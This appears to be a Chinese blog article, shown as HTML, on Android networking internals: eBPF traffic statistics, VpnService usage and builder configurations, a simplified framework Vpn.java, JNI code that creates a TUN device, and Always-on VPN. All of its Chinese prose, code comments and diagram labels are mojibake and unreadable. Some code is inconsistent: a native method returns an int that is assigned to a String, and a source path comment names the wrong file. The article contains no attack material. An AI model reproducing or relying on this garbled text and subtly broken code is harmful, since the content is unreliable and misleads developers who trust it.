        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkStats</span>.Entry(
            <span class="hljs-literal">null</span>, uid,
            SET_DEFAULT, TAG_NONE,
            METERED_NO, ROAMING_NO,
            DEFAULT_NETWORK_NO,
            value.rxBytes, value.rxPackets,
            value.txBytes, value.txPackets,
            <span class="hljs-number">0</span> <span class="hljs-comment">/* operations */</span>
        );
    }
}
</code></pre>
<p><strong>æ€§èƒ½æå‡</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">æµ‹è¯•åœºæ™¯: 1000ä¸ªåº”ç”¨åŒæ—¶è”ç½‘

iptablesæ–¹å¼:
  - è§„åˆ™åŒ¹é…æ—¶é—´: 1000 * 100Î¼<span class="hljs-attr">s</span> = <span class="hljs-number">100</span>ms
  - CPUå ç”¨: 15%

eBPFæ–¹å¼:
  - è§„åˆ™åŒ¹é…æ—¶é—´: 1000 * 10Î¼<span class="hljs-attr">s</span> = <span class="hljs-number">10</span>ms
  - CPUå ç”¨: 3%

æ€§èƒ½æå‡: 10å€å»¶è¿Ÿé™ä½ï¼Œ5å€CPUå‡å°‘
</code></pre>
<hr/>
<h2 data-id="heading-20">äºŒã€VPNæ¡†æ¶æ·±åº¦è§£æ</h2>
<h3 data-id="heading-21">2.1 VpnServiceæ¶æ„æ€»è§ˆ</h3>
<p><strong>VPN (Virtual Private Network)</strong> è™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼Œåœ¨Androidä¸­é€šè¿‡<code>VpnService</code>æ¡†æ¶å®ç°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47ab27f9a0a462fb4d05f9536092add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=oXivoQ02D3TSS5kHTUN4SKcVF0Q%3D" alt="08-02-vpn-workflow.png" loading="lazy"/></p>
<h4 data-id="heading-22">æ ¸å¿ƒç»„ä»¶</h4>
<pre><code class="hljs language-bash" lang="bash">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          Android VPNæ¶æ„                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                         â”‚
â”‚  åº”ç”¨å±‚                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  VpnService    â”‚ â† åº”ç”¨ç»§æ‰¿å®ç°      â”‚
â”‚  â”‚  (æŠ½è±¡åŸºç±»)     â”‚                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚         â†“                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Builder       â”‚ â† é…ç½®VPNå‚æ•°       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Frameworkå±‚                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Vpn.java      â”‚ â† VPNç®¡ç†æ ¸å¿ƒ       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚         â†“                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚ConnectivitySrv â”‚ â† ç½‘ç»œè¿æ¥ç®¡ç†      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Nativeå±‚                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Netd          â”‚ â† è·¯ç”±é…ç½®          â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Kernelå±‚                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  TUN Driver    â”‚ â† è™šæ‹Ÿç½‘å¡          â”‚
â”‚  â”‚  /dev/tun      â”‚                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-23">2.2 VpnServiceåº”ç”¨å±‚å®ç°</h3>
<h4 data-id="heading-24">åŸºç¡€VPNç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åº”ç”¨å®ç°VPNæœåŠ¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyVpnService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">VpnService</span> {

    <span class="hljs-keyword">private</span> ParcelFileDescriptor mInterface;
    <span class="hljs-keyword">private</span> Thread mVpnThread;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> {
        <span class="hljs-comment">// 1. å‡†å¤‡VPN (å¼¹å‡ºç”¨æˆ·æˆæƒå¯¹è¯æ¡†)</span>
        <span class="hljs-type">Intent</span> <span class="hljs-variable">prepare</span> <span class="hljs-operator">=</span> VpnService.prepare(<span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">if</span> (prepare != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// éœ€è¦ç”¨æˆ·æˆæƒ</span>
            startActivity(prepare);
            <span class="hljs-keyword">return</span> START_NOT_STICKY;
        }

        <span class="hljs-comment">// 2. å»ºç«‹VPNè¿æ¥</span>
        mVpnThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-built_in">this</span>::setupVpn);
        mVpnThread.start();

        <span class="hljs-keyword">return</span> START_STICKY;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupVpn</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. é…ç½®VPNå‚æ•°</span>
            <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>();
            builder
                <span class="hljs-comment">// è®¾ç½®VPNåœ°å€</span>
                .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)

                <span class="hljs-comment">// è®¾ç½®è·¯ç”± (æ‰€æœ‰æµé‡é€šè¿‡VPN)</span>
                .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)

                <span class="hljs-comment">// è®¾ç½®DNS</span>
                .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
                .addDnsServer(<span class="hljs-string">"8.8.4.4"</span>)

                <span class="hljs-comment">// è®¾ç½®MTU</span>
                .setMtu(<span class="hljs-number">1500</span>)

                <span class="hljs-comment">// è®¾ç½®ä¼šè¯åç§°</span>
                .setSession(<span class="hljs-string">"MyVPN"</span>)

                <span class="hljs-comment">// é…ç½®å…è®¸/ç¦æ­¢çš„åº”ç”¨</span>
                .addAllowedApplication(<span class="hljs-string">"com.example.app"</span>)
                .addDisallowedApplication(<span class="hljs-string">"com.example.excluded"</span>);

            <span class="hljs-comment">// 4. å»ºç«‹TUNæ¥å£</span>
            mInterface = builder.establish();
            <span class="hljs-keyword">if</span> (mInterface == <span class="hljs-literal">null</span>) {
                Log.e(TAG, <span class="hljs-string">"Failed to establish VPN"</span>);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 5. è·å–æ–‡ä»¶æè¿°ç¬¦</span>
            <span class="hljs-type">FileDescriptor</span> <span class="hljs-variable">fd</span> <span class="hljs-operator">=</span> mInterface.getFileDescriptor();

            <span class="hljs-comment">// 6. è¯»å†™TUNè®¾å¤‡</span>
            handleTraffic(fd);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            Log.e(TAG, <span class="hljs-string">"VPN setup failed"</span>, e);
        }
    }

    <span class="hljs-comment">// å¤„ç†TUNè®¾å¤‡æµé‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTraffic</span><span class="hljs-params">(FileDescriptor fd)</span> {
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fd);
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fd);

        <span class="hljs-type">byte</span>[] packet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32767</span>];

        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 1. ä»TUNè®¾å¤‡è¯»å–IPæ•°æ®åŒ…</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> in.read(packet);
                <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-comment">// 2. è§£æIPåŒ…</span>
                    <span class="hljs-type">IpPacket</span> <span class="hljs-variable">ipPacket</span> <span class="hljs-operator">=</span> parseIpPacket(packet, length);

                    <span class="hljs-comment">// 3. åŠ å¯†/å°è£…æ•°æ®</span>
                    <span class="hljs-type">byte</span>[] encrypted = encrypt(ipPacket);

                    <span class="hljs-comment">// 4. å‘é€åˆ°VPNæœåŠ¡å™¨</span>
                    sendToVpnServer(encrypted);
                }

                <span class="hljs-comment">// 5. ä»VPNæœåŠ¡å™¨æ¥æ”¶æ•°æ®</span>
                <span class="hljs-type">byte</span>[] received = receiveFromVpnServer();
                <span class="hljs-keyword">if</span> (received != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 6. è§£å¯†/è§£å°è£…</span>
                    <span class="hljs-type">byte</span>[] decrypted = decrypt(received);

                    <span class="hljs-comment">// 7. å†™å›TUNè®¾å¤‡</span>
                    out.write(decrypted);
                }

            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-keyword">break</span>;
            }
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (mVpnThread != <span class="hljs-literal">null</span>) {
            mVpnThread.interrupt();
        }
        <span class="hljs-keyword">if</span> (mInterface != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                mInterface.close();
            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-comment">// Ignore</span>
            }
        }
        <span class="hljs-built_in">super</span>.onDestroy();
    }
}
</code></pre>
<h4 data-id="heading-25">VPNé…ç½®è¯¦è§£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VpnConfigExample</span> {

    <span class="hljs-comment">// é…ç½®1ï¼šå…¨å±€VPN (æ‰€æœ‰æµé‡)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupGlobalVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)      <span class="hljs-comment">// æ‰€æœ‰IPv4æµé‡</span>
            .addRoute(<span class="hljs-string">"::"</span>, <span class="hljs-number">0</span>)           <span class="hljs-comment">// æ‰€æœ‰IPv6æµé‡</span>
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .establish();
    }

    <span class="hljs-comment">// é…ç½®2ï¼šåˆ†æµVPN (ä»…ç‰¹å®šç½‘æ®µ)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupSplitVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"192.168.0.0"</span>, <span class="hljs-number">16</span>)   <span class="hljs-comment">// ä»…ä¼ä¸šå†…ç½‘</span>
            .addRoute(<span class="hljs-string">"10.0.0.0"</span>, <span class="hljs-number">8</span>)       <span class="hljs-comment">// ä»…ç§æœ‰ç½‘ç»œ</span>
            .addDnsServer(<span class="hljs-string">"10.0.0.1"</span>)
            .establish();
    }

    <span class="hljs-comment">// é…ç½®3ï¼šåº”ç”¨çº§VPN (ä»…ç‰¹å®šåº”ç”¨)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupPerAppVpn</span><span class="hljs-params">(VpnService service)</span>
            <span class="hljs-keyword">throws</span> PackageManager.NameNotFoundException {
        <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>);

        <span class="hljs-comment">// æ–¹å¼1ï¼šç™½åå•æ¨¡å¼ (åªæœ‰æŒ‡å®šåº”ç”¨èµ°VPN)</span>
        builder.addAllowedApplication(<span class="hljs-string">"com.example.secure"</span>);
        builder.addAllowedApplication(<span class="hljs-string">"com.example.banking"</span>);

        <span class="hljs-comment">// æ–¹å¼2ï¼šé»‘åå•æ¨¡å¼ (æŒ‡å®šåº”ç”¨ä¸èµ°VPN)</span>
        <span class="hljs-comment">// builder.addDisallowedApplication("com.example.local");</span>

        <span class="hljs-keyword">return</span> builder.establish();
    }

    <span class="hljs-comment">// é…ç½®4ï¼šAlways-on VPN (ç³»ç»Ÿçº§æŒä¹…VPN)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupAlwaysOnVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .setBlocking(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// é˜»å¡æ¨¡å¼ï¼šVPNæ–­å¼€æ—¶é˜»æ­¢æ‰€æœ‰æµé‡</span>
            .establish();
    }
}
</code></pre>
<h3 data-id="heading-26">2.3 Frameworkå±‚VPNç®¡ç†</h3>
<p><strong>æºç ä½ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/connectivity/Vpn.java
</code></pre>
<h4 data-id="heading-27">Vpn.javaæ ¸å¿ƒå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java (ç®€åŒ–ç‰ˆ)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vpn</span> {

    <span class="hljs-comment">// VPNé…ç½®</span>
    <span class="hljs-keyword">private</span> VpnConfig mConfig;

    <span class="hljs-comment">// TUNæ¥å£åç§°</span>
    <span class="hljs-keyword">private</span> String mInterface;

    <span class="hljs-comment">// VPNç½‘ç»œ</span>
    <span class="hljs-keyword">private</span> Network mNetwork;

    <span class="hljs-comment">// VPN NetworkAgent</span>
    <span class="hljs-keyword">private</span> NetworkAgent mNetworkAgent;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•ï¼šå»ºç«‹VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> ParcelFileDescriptor <span class="hljs-title function_">establish</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// 1. æƒé™æ£€æŸ¥</span>
        enforceControlPermission();

        <span class="hljs-comment">// 2. åˆ›å»ºTUNè®¾å¤‡</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">interfaceName</span> <span class="hljs-operator">=</span> jniCreate(config.mtu);
        <span class="hljs-keyword">if</span> (interfaceName == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Failed to create TUN device"</span>);
        }
        mInterface = interfaceName;

        <span class="hljs-comment">// 3. é…ç½®TUNè®¾å¤‡åœ°å€</span>
        <span class="hljs-keyword">for</span> (LinkAddress address : config.addresses) {
            jniAddAddress(interfaceName, address.getAddress(),
                         address.getPrefixLength());
        }

        <span class="hljs-comment">// 4. é…ç½®è·¯ç”±</span>
        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Connection</span>();
        connection.interfaceName = interfaceName;
        connection.routes = config.routes;

        <span class="hljs-comment">// 5. é€šçŸ¥Netdé…ç½®è·¯ç”±</span>
        <span class="hljs-keyword">try</span> {
            mNetd.addVpnUidRanges(mInterface, config.allowedUidRanges);

            <span class="hljs-keyword">for</span> (RouteInfo route : config.routes) {
                mNetd.vpnAddRoute(mInterface, route);
            }
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Netd error"</span>, e);
        }

        <span class="hljs-comment">// 6. è®¾ç½®DNS</span>
        <span class="hljs-keyword">try</span> {
            mNetd.setDnsServersForInterface(interfaceName,
                                           config.dnsServers,
                                           config.searchDomains);
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-comment">// ...</span>
        }

        <span class="hljs-comment">// 7. åˆ›å»ºNetworkAgent</span>
        agentConnect(config);

        <span class="hljs-comment">// 8. æ‰“å¼€TUNè®¾å¤‡æ–‡ä»¶æè¿°ç¬¦</span>
        <span class="hljs-type">ParcelFileDescriptor</span> <span class="hljs-variable">tun</span> <span class="hljs-operator">=</span> ParcelFileDescriptor.adoptFd(
            jniGetFd(interfaceName)
        );

        <span class="hljs-keyword">return</span> tun;
    }

    <span class="hljs-comment">// åˆ›å»ºNetworkAgent</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentConnect</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// æ„å»ºNetworkCapabilities</span>
        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCapabilities</span>();
        caps.addTransportType(NetworkCapabilities.TRANSPORT_VPN);
        caps.removeCapability(NET_CAPABILITY_NOT_VPN);

        <span class="hljs-keyword">if</span> (config.allowBypass) {
            caps.addCapability(NET_CAPABILITY_NOT_RESTRICTED);
        }

        <span class="hljs-comment">// æ„å»ºLinkProperties</span>
        <span class="hljs-type">LinkProperties</span> <span class="hljs-variable">lp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkProperties</span>();
        lp.setInterfaceName(mInterface);

        <span class="hljs-comment">// åˆ›å»ºNetworkAgent</span>
        mNetworkAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgent</span>(mContext, mLooper,
            <span class="hljs-string">"VPN"</span>, caps, lp, <span class="hljs-number">0</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgentConfig</span>(), <span class="hljs-built_in">this</span>) {

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNetworkUnwanted</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// VPNè¢«ç§»é™¤</span>
                Vpn.<span class="hljs-built_in">this</span>.onNetworkUnwanted();
            }
        };

        mNetworkAgent.register();
        mNetwork = mNetworkAgent.getNetwork();
    }

    <span class="hljs-comment">// JNIæ–¹æ³• - åˆ›å»ºTUNè®¾å¤‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniCreate</span><span class="hljs-params">(<span class="hljs-type">int</span> mtu)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">jniGetName</span><span class="hljs-params">(<span class="hljs-type">int</span> tun)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jniAddAddress</span><span class="hljs-params">(String interfaceName,
                                     String address, <span class="hljs-type">int</span> prefixLen)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniGetFd</span><span class="hljs-params">(String interfaceName)</span>;
}
</code></pre>
<h4 data-id="heading-28">JNIå±‚TUNè®¾å¤‡æ“ä½œ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/base/core/jni/android_net_LocalSocketImpl.cpp</span>

<span class="hljs-function"><span class="hljs-type">static</span> jint <span class="hljs-title">com_android_server_connectivity_Vpn_jniCreate</span><span class="hljs-params">(JNIEnv* env,
                                                          jobject <span class="hljs-comment">/* clazz */</span>,
                                                          jint mtu)</span> </span>{
    <span class="hljs-comment">// 1. æ‰“å¼€TUNè®¾å¤‡</span>
    <span class="hljs-type">int</span> tun = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/tun"</span>, O_RDWR | O_NONBLOCK | O_CLOEXEC);
    <span class="hljs-keyword">if</span> (tun &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot open TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 2. é…ç½®TUNè®¾å¤‡</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;
    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ifr));
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;  <span class="hljs-comment">// TUNæ¨¡å¼ï¼Œæ— åè®®å¤´</span>
    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, <span class="hljs-string">"tun%d"</span>, IFNAMSIZ);

    <span class="hljs-comment">// 3. åˆ›å»ºTUNæ¥å£</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, TUNSETIFF, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">close</span>(tun);
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot configure TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 4. è®¾ç½®MTU</span>
    <span class="hljs-keyword">if</span> (mtu &gt; <span class="hljs-number">0</span> &amp;&amp; mtu != ifr.ifr_mtu) {
        ifr.ifr_mtu = mtu;
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, SIOCSIFMTU, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">ALOGW</span>(<span class="hljs-string">"Cannot set MTU"</span>);
        }
    }

    <span class="hljs-keyword">return</span> tun;
}

<span class="hljs-comment">// æ·»åŠ IPåœ°å€åˆ°TUNæ¥å£</span>
<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">com_android_server_connectivity_Vpn_jniAddAddress</span><span class="hljs-params">(
        JNIEnv* env, jobject <span class="hljs-comment">/* clazz */</span>,
        jstring jInterfaceName, jstring jAddress, jint prefixLen)</span> </span>{

    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* interfaceName = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jInterfaceName, <span class="hljs-literal">NULL</span>);
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* address = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jAddress, <span class="hljs-literal">NULL</span>);

    <span class="hljs-comment">// ä½¿ç”¨netlinkæ·»åŠ åœ°å€</span>
    <span class="hljs-keyword">struct</span> {
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">nlmsghdr</span> n;
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifaddrmsg</span> ifa;
        <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>];
    } req;

    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(req));
    req.n.nlmsg_len = <span class="hljs-built_in">NLMSG_LENGTH</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> ifaddrmsg));
    req.n.nlmsg_type = RTM_NEWADDR;
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    req.ifa.ifa_family = AF_INET;  <span class="hljs-comment">// æˆ–AF_INET6</span>
    req.ifa.ifa_prefixlen = prefixLen;
    req.ifa.ifa_index = if_nametoindex(interfaceName);

    <span class="hljs-comment">// æ·»åŠ åœ°å€å±æ€§...</span>
    <span class="hljs-built_in">addattr_l</span>(&amp;req.n, <span class="hljs-built_in">sizeof</span>(req), IFA_LOCAL, address, <span class="hljs-number">4</span>);

    <span class="hljs-comment">// å‘é€åˆ°å†…æ ¸...</span>
    <span class="hljs-built_in">send_netlink_message</span>(&amp;req.n);

    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jInterfaceName, interfaceName);
    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jAddress, address);
}
</code></pre>
<h3 data-id="heading-29">2.4 Always-on VPN</h3>
<p><strong>Always-on VPN</strong>æ˜¯Android 7.0å¼•å…¥çš„åŠŸèƒ½ï¼Œç¡®ä¿è®¾å¤‡å§‹ç»ˆé€šè¿‡VPNè¿æ¥ã€‚</p>
<h4 data-id="heading-30">å·¥ä½œæœºåˆ¶</h4>
<pre><code class="hljs language-markdown" lang="markdown">Always-on VPNå¼€å¯å:

<span class="hljs-bullet">1.</span> ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨VPN
   â†’ æ— éœ€ç”¨æˆ·æ‰‹åŠ¨è¿æ¥

<span class="hljs-bullet">2.</span> VPNæ–­å¼€æ—¶é˜»æ­¢æ‰€æœ‰ç½‘ç»œè®¿é—®
   â†’ "Block connections without VPN"é€‰é¡¹

<span class="hljs-bullet">3.</span> VPNæœåŠ¡å´©æºƒæ—¶è‡ªåŠ¨é‡è¿
   â†’ ç”±ç³»ç»Ÿç›‘æ§å¹¶é‡å¯

<span class="hljs-bullet">4.</span> ä¸å…è®¸ç”¨æˆ·æ‰‹åŠ¨æ–­å¼€
   â†’ åªæœ‰ç®¡ç†å‘˜å¯ä»¥å…³é—­
</code></pre>
<h4 data-id="heading-31">é…ç½®Always-on VPN</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç³»ç»Ÿè®¾ç½® - é…ç½®Always-on VPN</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AlwaysOnVpnConfig</span> {

    <span class="hljs-comment">// è®¾ç½®Always-on VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAlwaysOnVpn</span><span class="hljs-params">(Context context, String packageName,
                               <span class="hljs-type">boolean</span> lockdownEnabled)</span> {
